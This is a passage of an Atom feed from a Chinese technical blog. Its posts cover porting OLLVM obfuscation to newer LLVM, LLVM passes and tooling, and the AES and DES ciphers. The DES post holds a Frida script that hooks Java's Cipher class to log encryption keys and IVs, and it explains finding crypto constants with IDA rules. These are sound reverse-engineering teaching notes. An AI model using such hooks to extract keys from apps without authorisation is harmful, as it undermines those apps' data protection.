<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>打渔为生</title>
  
  <subtitle>tutucoo的技术笔记</subtitle>
  <link href="https://tutucoo.github.io/atom.xml" rel="self"/>
  
  <link href="https://tutucoo.github.io/"/>
  <updated>2022-02-11T07:26:27.585Z</updated>
  <id>https://tutucoo.github.io/</id>
  
  <author>
    <name>tutucoo</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>ollvm@OLLVM移植到新版本LLVM</title>
    <link href="https://tutucoo.github.io/2022/02/11/ollvm@OLLVM%E7%A7%BB%E6%A4%8D%E5%88%B0%E6%96%B0%E7%89%88%E6%9C%ACLLVM/"/>
    <id>https://tutucoo.github.io/2022/02/11/ollvm@OLLVM%E7%A7%BB%E6%A4%8D%E5%88%B0%E6%96%B0%E7%89%88%E6%9C%ACLLVM/</id>
    <published>2022-02-11T07:25:37.000Z</published>
    <updated>2022-02-11T07:26:27.585Z</updated>
    
    <content type="html"><![CDATA[<h1 id="OLLVM移植到新版本LLVM"><a href="#OLLVM移植到新版本LLVM" class="headerlink" title="OLLVM移植到新版本LLVM"></a>OLLVM移植到新版本LLVM</h1><p>由于OLLVM已经好几年没有更新了，最近的更新还是基于LLVM4.0的</p><p>进入ollvm github仓库查看文件可以看到修改的位置</p><p><img src="https://gitee.com/tutucoo/images/raw/master/uPic/20220211t33Jkn.png" alt="Untitled"></p><p>下载ollvm</p><p><img src="https://gitee.com/tutucoo/images/raw/master/uPic/20220211nxMT6F.png" alt="Untitled"></p><p>切换到llvm-4.0分支</p><p><img src="https://gitee.com/tutucoo/images/raw/master/uPic/20220211Kk1CrI.png" alt="Untitled"></p><p>把Obfuscation目录复制到llvm的Transforms目录下 </p><p><img src="https://gitee.com/tutucoo/images/raw/master/uPic/20220211pVXCy6.png" alt="Untitled"></p><p><img src="https://gitee.com/tutucoo/images/raw/master/uPic/20220211Hd5Qb8.png" alt="Untitled"></p><p>修改Transforms/CMakeLists.txt文件</p><p><img src="https://gitee.com/tutucoo/images/raw/master/uPic/20220211XKN0eh.png" alt="Untitled"></p><p>修改Transform/LLVMBuild.txt文件</p><p><img src="https://gitee.com/tutucoo/images/raw/master/uPic/20220211mhJCkz.png" alt="Untitled"></p><p>进入IPO目录，找到PassManagerBuilder.cpp</p><p><img src="https://gitee.com/tutucoo/images/raw/master/uPic/20220211hZ8ijP.png" alt="Untitled"></p><p>如果路径下的文件不存在，把文件拷贝到路径下就可以了 </p><p><img src="https://gitee.com/tutucoo/images/raw/master/uPic/20220211Nvg1AQ.png" alt="Untitled"></p><p>可以通过查看github上面的文件修改历史知道做了哪些改动</p><p>PassManagerBuilder.cpp还添加了下面的代码</p><p><img src="https://gitee.com/tutucoo/images/raw/master/uPic/20220211n3ZKG3.png" alt="Untitled"></p><p>初始化了AesSeed，这些代码都是LLVM没有的，在移植过去的时候需要添加，另外还有一些简单的改动文件，移植的时候注意下就可以了，这里就不一一截图了 </p><p><img src="https://gitee.com/tutucoo/images/raw/master/uPic/20220211wAGPfj.png" alt="Untitled"></p><p>修改好了以后就可以用ninja LLVMObfuscation编译OLLVM了 </p><p>OLLVM有些bug被修复了，根据这些修改对文件进行修改</p><p><img src="https://gitee.com/tutucoo/images/raw/master/uPic/20220211PHJN23.png" alt="Untitled"></p><p>使用ninja clang指令进行编译，如果顺利就移植成功了</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;OLLVM移植到新版本LLVM&quot;&gt;&lt;a href=&quot;#OLLVM移植到新版本LLVM&quot; class=&quot;headerlink&quot; title=&quot;OLLVM移植到新版本LLVM&quot;&gt;&lt;/a&gt;OLLVM移植到新版本LLVM&lt;/h1&gt;&lt;p&gt;由于OLLVM已经好几年没有更新了，</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>ollvm@pass基本使用</title>
    <link href="https://tutucoo.github.io/2022/02/11/ollvm@pass%E5%9F%BA%E6%9C%AC%E4%BD%BF%E7%94%A8/"/>
    <id>https://tutucoo.github.io/2022/02/11/ollvm@pass%E5%9F%BA%E6%9C%AC%E4%BD%BF%E7%94%A8/</id>
    <published>2022-02-11T07:19:37.000Z</published>
    <updated>2022-02-11T07:21:50.174Z</updated>
    
    <content type="html"><![CDATA[<h1 id="pass基本使用"><a href="#pass基本使用" class="headerlink" title="pass基本使用"></a>pass基本使用</h1><h2 id="概述"><a href="#概述" class="headerlink" title="概述"></a>概述</h2><p>pass是LLVM里面重要的框架，不同的pass用于源代码在编译之前进行优化，可以复杂化也可以简单化，ollvm就是pass的一种</p><p>下图对bc文件执行了pass，bc文件是机器语言，但是通过—print-bb这个pass，可以打印中间代码</p><p><img src="https://gitee.com/tutucoo/images/raw/master/uPic/20220211u3Xq8m.png" alt="Untitled"></p><p>每个pass都会调用runOnFunction函数，可以对要处理的函数进行修改</p><p><img src="https://gitee.com/tutucoo/images/raw/master/uPic/20220211nsZXyP.png" alt="Untitled"></p><h2 id="pass使用方法"><a href="#pass使用方法" class="headerlink" title="pass使用方法"></a>pass使用方法</h2><p>pass在llvm根目录下lib文件夹的Transforms文件夹中</p><p><img src="https://gitee.com/tutucoo/images/raw/master/uPic/20220211j9yz7h.png" alt="Untitled"></p><p>在进行编译时,目标程序的函数都会传递给runOnFunction函数，这个pass只是打印了函数的名字</p><p><img src="https://gitee.com/tutucoo/images/raw/master/uPic/20220211Ksp67O.png" alt="Untitled"></p><p>查看这个pass的CMakeLists.txt文件，添加opt，那么就会生成对应的so文件 </p><p><img src="https://gitee.com/tutucoo/images/raw/master/uPic/202202116LgN3m.png" alt="Untitled"></p><p>生成的pass名字是LLVMHello.so</p><p><img src="https://gitee.com/tutucoo/images/raw/master/uPic/20220211xho6og.png" alt="Untitled"></p><p>下图是使用自定义pass的命令，-hello是自定义pass定义的参数，可以看到这个pass的功能是打印了一个函数名称main</p><p><img src="https://gitee.com/tutucoo/images/raw/master/uPic/20220211fPzoLR.png" alt="Untitled"></p><p>再给C文件添加个函数test_hello1</p><p><img src="https://gitee.com/tutucoo/images/raw/master/uPic/20220211Uupk4q.png" alt="Untitled"></p><p>hello.clang.ll还存在一些外部的函数，比如说printf，它不受pass影响，所以这个函数名没有打印出来，pass只能优化我们自己写的代码 </p><p><img src="https://gitee.com/tutucoo/images/raw/master/uPic/20220211Wao4vg.png" alt="Untitled"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;pass基本使用&quot;&gt;&lt;a href=&quot;#pass基本使用&quot; class=&quot;headerlink&quot; title=&quot;pass基本使用&quot;&gt;&lt;/a&gt;pass基本使用&lt;/h1&gt;&lt;h2 id=&quot;概述&quot;&gt;&lt;a href=&quot;#概述&quot; class=&quot;headerlink&quot; titl</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>ollvm@LLVM基础：编译、调试、工具</title>
    <link href="https://tutucoo.github.io/2022/02/11/ollvm@LLVM%E5%9F%BA%E7%A1%80%EF%BC%9A%E7%BC%96%E8%AF%91%E3%80%81%E8%B0%83%E8%AF%95%E3%80%81%E5%B7%A5%E5%85%B7/"/>
    <id>https://tutucoo.github.io/2022/02/11/ollvm@LLVM%E5%9F%BA%E7%A1%80%EF%BC%9A%E7%BC%96%E8%AF%91%E3%80%81%E8%B0%83%E8%AF%95%E3%80%81%E5%B7%A5%E5%85%B7/</id>
    <published>2022-02-11T07:15:37.000Z</published>
    <updated>2022-02-11T07:21:40.677Z</updated>
    
    <content type="html"><![CDATA[<h1 id="LLVM基础：编译、调试、工具"><a href="#LLVM基础：编译、调试、工具" class="headerlink" title="LLVM基础：编译、调试、工具"></a>LLVM基础：编译、调试、工具</h1><h2 id="LLVM简介"><a href="#LLVM简介" class="headerlink" title="LLVM简介"></a>LLVM简介</h2><p>LLVM包含了很多项目 </p><p><img src="https://gitee.com/tutucoo/images/raw/master/uPic/20220211AkfVtX.png" alt="Untitled"></p><h2 id="llvm下载"><a href="#llvm下载" class="headerlink" title="llvm下载"></a>llvm下载</h2><p>ndk的llvm/bin目录下，有llvm套件，可以查看这些工具的版本，然后在llvm官网下载相近的版本就可以了</p><figure class="highlight jsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./clang --version</span><br></pre></td></tr></table></figure><p>llvm源码目录</p><p><img src="https://gitee.com/tutucoo/images/raw/master/uPic/202202117mMtGq.png" alt="Untitled"></p><h2 id="llvm编译"><a href="#llvm编译" class="headerlink" title="llvm编译"></a>llvm编译</h2><h3 id="环境准备"><a href="#环境准备" class="headerlink" title="环境准备"></a>环境准备</h3><p>进入llvm.org/docs找到llvm文档，按照文档中环境要求进行安装和配置</p><p><img src="https://gitee.com/tutucoo/images/raw/master/uPic/20220211GIDrhI.png" alt="Untitled"></p><p>有个方便的做法是把安卓源码依赖的程序全部安装上，这样基本就满足了llvm编译的环境要求了 </p><p><img src="https://gitee.com/tutucoo/images/raw/master/uPic/20220211M7Syja.png" alt="Untitled"></p><h3 id="编译debug版本"><a href="#编译debug版本" class="headerlink" title="编译debug版本"></a>编译debug版本</h3><p>进入llvm根目录创建build_debug目录并进入该目录，执行下面的命令</p><p><img src="https://gitee.com/tutucoo/images/raw/master/uPic/20220211mgCSNc.png" alt="Untitled"></p><p>然后再执行ninja -j8命令</p><p><img src="https://gitee.com/tutucoo/images/raw/master/uPic/20220211Q8e6Tn.png" alt="Untitled"></p><h3 id="编译release版本"><a href="#编译release版本" class="headerlink" title="编译release版本"></a>编译release版本</h3><p>在根目录下创建build_release目录并进入这个目录下，执行下面的命令</p><p>-DLLVM_ENABLE_PROJECTS=”clang”的意思添加编译clang程序，这样生成的bin目录下就有clang的可执行程序了</p><p><img src="https://gitee.com/tutucoo/images/raw/master/uPic/20220211b015uU.png" alt="Untitled"></p><h3 id="使用CLion进行编译"><a href="#使用CLion进行编译" class="headerlink" title="使用CLion进行编译"></a>使用CLion进行编译</h3><p>打开项目，路径选择根目录llvm目录下的CMakeLists.txt文件 </p><p><img src="https://gitee.com/tutucoo/images/raw/master/uPic/20220211yros28.png" alt="Untitled"></p><p>进入设置，指定编译选项</p><p><img src="https://gitee.com/tutucoo/images/raw/master/uPic/20220211JMuA3C.png" alt="Untitled"></p><p>点击确定之后项目会自动进行build</p><p><img src="https://gitee.com/tutucoo/images/raw/master/uPic/20220211uKw8bl.png" alt="Untitled"></p><p>关闭CLion，进入命令行执行ninja -j8进行编译 </p><p>可以给CLion增加内存</p><p><img src="https://gitee.com/tutucoo/images/raw/master/uPic/20220211QlkRNp.png" alt="Untitled"></p><p><img src="https://gitee.com/tutucoo/images/raw/master/uPic/20220211wC6Esy.png" alt="Untitled"></p><p>也可以进入cmake-build-debug目录单独编译某一个项目，比如说clang</p><p><img src="https://gitee.com/tutucoo/images/raw/master/uPic/20220211yHWUtS.png" alt="Untitled"></p><h2 id="测试编译的Clang程序"><a href="#测试编译的Clang程序" class="headerlink" title="测试编译的Clang程序"></a>测试编译的Clang程序</h2><p>写一个简单的C文件</p><p><img src="https://gitee.com/tutucoo/images/raw/master/uPic/20220211sBvRcw.png" alt="Untitled"></p><p>控制台添加刚编译的clang程序的环境变量</p><figure class="highlight jsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">export</span> PATH=<span class="regexp">/home/</span>ollvm/llvm-project-<span class="number">9.0</span><span class="number">.1</span>/llvm/cmake-build-debug/bin:$PATH</span><br></pre></td></tr></table></figure><p>使用clang对C文件进行编译并运行 </p><figure class="highlight jsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">clang hello_clang.c -o hello_clang</span><br><span class="line">./hello_clang</span><br></pre></td></tr></table></figure><h2 id="调试编译的Clang程序"><a href="#调试编译的Clang程序" class="headerlink" title="调试编译的Clang程序"></a>调试编译的Clang程序</h2><p>找到clang程序  </p><p><img src="https://gitee.com/tutucoo/images/raw/master/uPic/20220211hD618k.png" alt="Untitled"></p><p>设置路径为刚才编辑的c文件</p><p><img src="https://gitee.com/tutucoo/images/raw/master/uPic/20220211b85gdL.png" alt="Untitled"></p><p>点击确定后，目录下生成了一个可执行文件hello_clang_clion</p><p>然后找到clang目录下的tools里面的driver.cpp</p><p><img src="https://gitee.com/tutucoo/images/raw/master/uPic/20220211lWnJdN.png" alt="Untitled"></p><p><img src="https://gitee.com/tutucoo/images/raw/master/uPic/20220211gEg0ov.png" alt="Untitled"></p><p>在main函数下断点就可以对clang进行调试了 </p><p><img src="https://gitee.com/tutucoo/images/raw/master/uPic/202202113lBfwn.png" alt="Untitled"></p><h2 id="调试opt程序"><a href="#调试opt程序" class="headerlink" title="调试opt程序"></a>调试opt程序</h2><p>找到opt，然后进入配置</p><p><img src="https://gitee.com/tutucoo/images/raw/master/uPic/20220211sf5Tbi.png" alt="Untitled"></p><p>把下图的参数填入Program arguments中</p><p><img src="https://gitee.com/tutucoo/images/raw/master/uPic/20220211Xvz3xM.png" alt="Untitled"></p><p>hello_clang.dll文件路径需要修改为绝对路径，如果程序无法运行，可以把so文件路径的单引号去掉试试</p><p><img src="https://gitee.com/tutucoo/images/raw/master/uPic/20220211ze7uCf.png" alt="Untitled"></p><p>opt工具在tools文件夹下</p><p><img src="https://gitee.com/tutucoo/images/raw/master/uPic/20220211sD4R2X.png" alt="Untitled"></p><p>然后在main函数中下断，之后就可以进行调试了</p><p><img src="https://gitee.com/tutucoo/images/raw/master/uPic/20220211T9Af1l.png" alt="Untitled"></p><p>中间文件的源文件也可以下断点进行调试</p><p><img src="https://gitee.com/tutucoo/images/raw/master/uPic/20220211J7A1z7.png" alt="Untitled"></p><h2 id="llvm工具"><a href="#llvm工具" class="headerlink" title="llvm工具"></a>llvm工具</h2><h3 id="编译中间语言"><a href="#编译中间语言" class="headerlink" title="编译中间语言"></a>编译中间语言</h3><p>编译成中间语言，中间语言可以转为不同平台的汇编语言</p><figure class="highlight jsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">clang -emit-llvm -S hello_clang.c -o hello_clang.ll</span><br></pre></td></tr></table></figure><p>生成的ll文件</p><p><img src="https://gitee.com/tutucoo/images/raw/master/uPic/20220211Lri4fu.png" alt="Untitled"></p><p>中间语言文件一样可以被执行</p><figure class="highlight jsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">lli hello_clang.ll</span><br></pre></td></tr></table></figure><h3 id="llvm-as工具"><a href="#llvm-as工具" class="headerlink" title="llvm-as工具"></a>llvm-as工具</h3><p>转为汇编之前要先转为bitcode文件，通过llvm-as工具完成</p><figure class="highlight jsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">llvm-<span class="keyword">as</span> hello_clang.ll -o hello_clang.bc</span><br></pre></td></tr></table></figure><h3 id="llc工具"><a href="#llc工具" class="headerlink" title="llc工具"></a>llc工具</h3><p>通过llc工具把bitcode文件转为汇编文件</p><figure class="highlight jsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">llc hello_clang.bc -o hello_clang.s</span><br></pre></td></tr></table></figure><h3 id="llvm-dis工具"><a href="#llvm-dis工具" class="headerlink" title="llvm-dis工具"></a>llvm-dis工具</h3><p>通过llvm-dis工具将bitcode文件转为中间文件</p><figure class="highlight jsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">llvm-dis hello_clang.bc -o hello_clang_re.ll</span><br></pre></td></tr></table></figure><h3 id="opt工具"><a href="#opt工具" class="headerlink" title="opt工具"></a>opt工具</h3><p>opt工具主要的作用有两个：</p><ul><li>查看bitcode文件</li><li>对bc文件或ll文件执行pass</li></ul>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;LLVM基础：编译、调试、工具&quot;&gt;&lt;a href=&quot;#LLVM基础：编译、调试、工具&quot; class=&quot;headerlink&quot; title=&quot;LLVM基础：编译、调试、工具&quot;&gt;&lt;/a&gt;LLVM基础：编译、调试、工具&lt;/h1&gt;&lt;h2 id=&quot;LLVM简介&quot;&gt;&lt;a hr</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>算法@分组加密算法的的填充模式和工作模式</title>
    <link href="https://tutucoo.github.io/2022/02/11/%E7%AE%97%E6%B3%95@%E5%88%86%E7%BB%84%E5%8A%A0%E5%AF%86%E7%AE%97%E6%B3%95%E7%9A%84%E7%9A%84%E5%A1%AB%E5%85%85%E6%A8%A1%E5%BC%8F%E5%92%8C%E5%B7%A5%E4%BD%9C%E6%A8%A1%E5%BC%8F/"/>
    <id>https://tutucoo.github.io/2022/02/11/%E7%AE%97%E6%B3%95@%E5%88%86%E7%BB%84%E5%8A%A0%E5%AF%86%E7%AE%97%E6%B3%95%E7%9A%84%E7%9A%84%E5%A1%AB%E5%85%85%E6%A8%A1%E5%BC%8F%E5%92%8C%E5%B7%A5%E4%BD%9C%E6%A8%A1%E5%BC%8F/</id>
    <published>2022-02-11T07:12:37.000Z</published>
    <updated>2022-02-11T07:12:45.378Z</updated>
    
    <content type="html"><![CDATA[<h1 id="分组加密算法的的填充模式和工作模式"><a href="#分组加密算法的的填充模式和工作模式" class="headerlink" title="分组加密算法的的填充模式和工作模式"></a>分组加密算法的的填充模式和工作模式</h1><h2 id="概述"><a href="#概述" class="headerlink" title="概述"></a>概述</h2><p>分组密码分别支持的工作模式和填充模式</p><p><img src="https://gitee.com/tutucoo/images/raw/master/uPic/20220211iFK4Nh.png" alt="%E5%88%86%E7%BB%84%E5%8A%A0%E5%AF%86%E7%AE%97%E6%B3%95%E7%9A%84%E7%9A%84%E5%A1%AB%E5%85%85%E6%A8%A1%E5%BC%8F%E5%92%8C%E5%B7%A5%E4%BD%9C%E6%A8%A1%E5%BC%8F%2078d599c8de674cdab241a48fbd86e55f/Untitled.png"></p><h2 id="分组密码的填充模式"><a href="#分组密码的填充模式" class="headerlink" title="分组密码的填充模式"></a>分组密码的填充模式</h2><p>明文长度不够一个分组时：对不够一个分组大小时，制定一定的标准进行填充，使加密内容的长度到达一个分组大小；在解密时按照相同的标准再将填充部分删掉即可。有时，对于恰好已经是一个明文长度的分组也会填充，这时就会填充一个新的分组。</p><h2 id="分组密码的工作模式"><a href="#分组密码的工作模式" class="headerlink" title="分组密码的工作模式"></a>分组密码的工作模式</h2><p>即对每一个明文分组加密的方式，主要有以下几种：</p><p><img src="https://gitee.com/tutucoo/images/raw/master/uPic/20220211o9zTeF.png" alt="%E5%88%86%E7%BB%84%E5%8A%A0%E5%AF%86%E7%AE%97%E6%B3%95%E7%9A%84%E7%9A%84%E5%A1%AB%E5%85%85%E6%A8%A1%E5%BC%8F%E5%92%8C%E5%B7%A5%E4%BD%9C%E6%A8%A1%E5%BC%8F%2078d599c8de674cdab241a48fbd86e55f/Untitled%201.png"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;分组加密算法的的填充模式和工作模式&quot;&gt;&lt;a href=&quot;#分组加密算法的的填充模式和工作模式&quot; class=&quot;headerlink&quot; title=&quot;分组加密算法的的填充模式和工作模式&quot;&gt;&lt;/a&gt;分组加密算法的的填充模式和工作模式&lt;/h1&gt;&lt;h2 id=&quot;概述&quot;&gt;&lt;</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>算法@分组密码之AES</title>
    <link href="https://tutucoo.github.io/2022/02/11/%E7%AE%97%E6%B3%95@%E5%88%86%E7%BB%84%E5%AF%86%E7%A0%81%E4%B9%8BAES/"/>
    <id>https://tutucoo.github.io/2022/02/11/%E7%AE%97%E6%B3%95@%E5%88%86%E7%BB%84%E5%AF%86%E7%A0%81%E4%B9%8BAES/</id>
    <published>2022-02-11T07:10:37.000Z</published>
    <updated>2022-02-11T07:11:41.378Z</updated>
    
    <content type="html"><![CDATA[<h1 id="分组密码之AES"><a href="#分组密码之AES" class="headerlink" title="分组密码之AES"></a>分组密码之AES</h1><p>以AES-128为例，会对明文分组进行10轮迭代运算，加密的第1轮到第9轮的轮函数一样，包括4个操作：字节替换、行位移、列混合和轮密钥加。最后一轮迭代不执行列混合。另外，在第一轮迭代之前，先将明文和原始密钥进行一次异或加密操作</p><p><img src="https://gitee.com/tutucoo/images/raw/master/uPic/202202111r6VS2.png" alt="%E5%88%86%E7%BB%84%E5%AF%86%E7%A0%81%E4%B9%8BAES%208f5210e1a4174f6a8f8795491ae7e026/Untitled.png"></p><p><img src="https://gitee.com/tutucoo/images/raw/master/uPic/20220211woepIT.png" alt="%E5%88%86%E7%BB%84%E5%AF%86%E7%A0%81%E4%B9%8BAES%208f5210e1a4174f6a8f8795491ae7e026/Untitled%201.png"></p><p>字节代替：字节代替的主要是通过s盒完成一个字节到另一个字节的映射</p><p><img src="https://gitee.com/tutucoo/images/raw/master/uPic/20220211Lldjvz.png" alt="Untitled"></p><p>行位移：第一行保持不变，第二行循环左移1个字节，第三行循环左移2个字节，第四行循环左移3个字节 </p><p><img src="https://gitee.com/tutucoo/images/raw/master/uPic/20220211b5UQNG.png" alt="Untitled"></p><p>列混淆：主要用于提供AES算法的扩散性，对列混淆矩阵相乘得到结果</p><p><img src="https://gitee.com/tutucoo/images/raw/master/uPic/20220211D1a67h.png" alt="Untitled"></p><p>轮密钥加：每轮的输入与轮密钥异或一次（当前分组和扩展密钥的一部分进行按位异或），因为二进制连续异或一个数结果是不变的，所以在解密时再异或该密钥就可恢复</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;分组密码之AES&quot;&gt;&lt;a href=&quot;#分组密码之AES&quot; class=&quot;headerlink&quot; title=&quot;分组密码之AES&quot;&gt;&lt;/a&gt;分组密码之AES&lt;/h1&gt;&lt;p&gt;以AES-128为例，会对明文分组进行10轮迭代运算，加密的第1轮到第9轮的轮函数一样，包括</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>算法@分组密码之DES</title>
    <link href="https://tutucoo.github.io/2022/02/11/%E7%AE%97%E6%B3%95@%E5%88%86%E7%BB%84%E5%AF%86%E7%A0%81%E4%B9%8BDES/"/>
    <id>https://tutucoo.github.io/2022/02/11/%E7%AE%97%E6%B3%95@%E5%88%86%E7%BB%84%E5%AF%86%E7%A0%81%E4%B9%8BDES/</id>
    <published>2022-02-11T07:09:37.000Z</published>
    <updated>2022-02-11T07:09:27.843Z</updated>
    
    <content type="html"><![CDATA[<h1 id="分组密码之DES"><a href="#分组密码之DES" class="headerlink" title="分组密码之DES"></a>分组密码之DES</h1><h2 id="概述"><a href="#概述" class="headerlink" title="概述"></a>概述</h2><p>DES算法会将明文按64位进行分组，密钥长64位，其中有56位参与DES运算，其余的几位是检验位，分组后的明文会跟56位密钥进行按位替代或交换形成密文</p><p>每次加密会对64位明文进行16轮编码，每一轮都会用密钥生成的子密钥进行运算</p><p>DES主要的处理过程分为两部分，首先是密钥的生成，然后是明文的处理</p><p><img src="https://s2.loli.net/2022/02/11/mEyAYxR1QSb4Bhu.png" alt="%E5%88%86%E7%BB%84%E5%AF%86%E7%A0%81%E4%B9%8BDES%201e6af285bea940e0a60f26ecade3ae13/Untitled.png"></p><h2 id="DES算法中出现的常量表"><a href="#DES算法中出现的常量表" class="headerlink" title="DES算法中出现的常量表"></a>DES算法中出现的常量表</h2><p>在对每一个64位明文分组进行处理的过程中，有大量常量表参与，从而完成对明文的混淆、扩散等处理。主要常量表有：初始置换表、逆初始置换表、扩展置换E表、8个s-box，这些常量都是快速判断DES算法的标志</p><p><img src="https://s2.loli.net/2022/02/11/hSwx82KXNmYZLzo.png" alt="Untitled"></p><p>在针对明文分组16轮处理过程中，每一轮都需要一个由原始56位密钥经过编排生成的48位子密钥的参与，这个过程中也出现了一些常量表，主要有：初始置换PC-1表、PC-2表</p><p><img src="https://s2.loli.net/2022/02/11/EcxWTZ5LNCmt36J.png" alt="Untitled"></p><h2 id="双重DES和三重DES"><a href="#双重DES和三重DES" class="headerlink" title="双重DES和三重DES"></a>双重DES和三重DES</h2><p>双重DES就是首先用key1对明文进行加密得到加密字符串，再用key2对加密字符串再进行加密得到最终加密字符串</p><p>三重DES是类似的概念，只是加密多加了一轮</p><h2 id="Java中使用DES加密"><a href="#Java中使用DES加密" class="headerlink" title="Java中使用DES加密"></a>Java中使用DES加密</h2><p>Java中使用DES算法</p><p><img src="https://s2.loli.net/2022/02/11/lKZ1G2kadeSUWy9.png" alt="%E5%88%86%E7%BB%84%E5%AF%86%E7%A0%81%E4%B9%8BDES%201e6af285bea940e0a60f26ecade3ae13/Untitled%203.png"></p><p>iv是初始化向量参数</p><p>PKCS5Padding表示分组的填充方式</p><p><img src="https://s2.loli.net/2022/02/11/1PwoyYEqrcHkQ4p.png" alt="%E5%88%86%E7%BB%84%E5%AF%86%E7%A0%81%E4%B9%8BDES%201e6af285bea940e0a60f26ecade3ae13/Untitled%204.png"></p><h2 id="对DES加密进行hook"><a href="#对DES加密进行hook" class="headerlink" title="对DES加密进行hook"></a>对DES加密进行hook</h2><p>下面有些函数需要重载</p><figure class="highlight jsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">main</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">Java.perform(<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        Java.use(<span class="string">&#x27;javax.crypto.Cipher&#x27;</span>).getInstance.implementation = <span class="function"><span class="keyword">function</span> (<span class="params">arg0</span>) </span>&#123;</span><br><span class="line">            <span class="built_in">console</span>.log(<span class="string">&#x27;javax.crypto.Cipher.getInstance is called!&#x27;</span>,arg0);</span><br><span class="line">            <span class="keyword">var</span> result = <span class="built_in">this</span>.getInstance(arg0);</span><br><span class="line">            <span class="keyword">return</span> result;</span><br><span class="line">        &#125;;</span><br><span class="line">        Java.use(<span class="string">&#x27;javax.crypto.Cipher&#x27;</span>).init.implementation = <span class="function"><span class="keyword">function</span> (<span class="params">arg0,arg1,arg2</span>) </span>&#123;</span><br><span class="line">            <span class="built_in">console</span>.log(<span class="string">&#x27;javax.crypto.Cipher.init is called!&#x27;</span>,arg0,arg1,arg2);</span><br><span class="line">            <span class="keyword">var</span> mode = arg0;</span><br><span class="line">            <span class="keyword">var</span> key = arg1;</span><br><span class="line">            <span class="keyword">var</span> iv = arg2;</span><br><span class="line">            <span class="keyword">var</span> key_bytes = key.getEncoded();</span><br><span class="line">            <span class="keyword">var</span> iv_bytes = iv.getIV();</span><br><span class="line">            <span class="built_in">console</span>.log(<span class="string">&#x27;javax.crypto.Cipher.init is called!&#x27;</span>,mode,key_bytes,iv_bytes);</span><br><span class="line">            <span class="keyword">var</span> result = <span class="built_in">this</span>.init(arg0,arg1,arg2);</span><br><span class="line">            <span class="keyword">return</span> result;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="DES的识别"><a href="#DES的识别" class="headerlink" title="DES的识别"></a>DES的识别</h2><p>可以使用findcrypt3进行识别 ，这个插件通过识别常量来判断有没有加密，是哪种加密</p><p><img src="https://s2.loli.net/2022/02/11/NUj3snxCvqMDBip.png" alt="%E5%88%86%E7%BB%84%E5%AF%86%E7%A0%81%E4%B9%8BDES%201e6af285bea940e0a60f26ecade3ae13/Untitled%205.png"></p><p>所以我们也可以自己写规则，用来识别加密算法，现在很多用的都不是标准DES的S盒，因此标准DES反而识别不出来，需要自己写规则识别</p><p><img src="https://gitee.com/tutucoo/images/raw/master/uPic/20220211MIt04G.png" alt="%E5%88%86%E7%BB%84%E5%AF%86%E7%A0%81%E4%B9%8BDES%201e6af285bea940e0a60f26ecade3ae13/Untitled%206.png"></p><p>另外，可以在IDA中搜E_table这样的字符串，然后把字符串的值填到规则里面</p><p><img src="https://gitee.com/tutucoo/images/raw/master/uPic/20220211fEFP48.png" alt="%E5%88%86%E7%BB%84%E5%AF%86%E7%A0%81%E4%B9%8BDES%201e6af285bea940e0a60f26ecade3ae13/Untitled%207.png"></p><p>当然也可以通过hook api查看DES加密函数有没有被调用</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;分组密码之DES&quot;&gt;&lt;a href=&quot;#分组密码之DES&quot; class=&quot;headerlink&quot; title=&quot;分组密码之DES&quot;&gt;&lt;/a&gt;分组密码之DES&lt;/h1&gt;&lt;h2 id=&quot;概述&quot;&gt;&lt;a href=&quot;#概述&quot; class=&quot;headerlink&quot; titl</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>算法@RC4算法</title>
    <link href="https://tutucoo.github.io/2022/02/11/%E7%AE%97%E6%B3%95@RC4%E7%AE%97%E6%B3%95/"/>
    <id>https://tutucoo.github.io/2022/02/11/%E7%AE%97%E6%B3%95@RC4%E7%AE%97%E6%B3%95/</id>
    <published>2022-02-11T07:00:37.000Z</published>
    <updated>2022-02-11T07:00:52.099Z</updated>
    
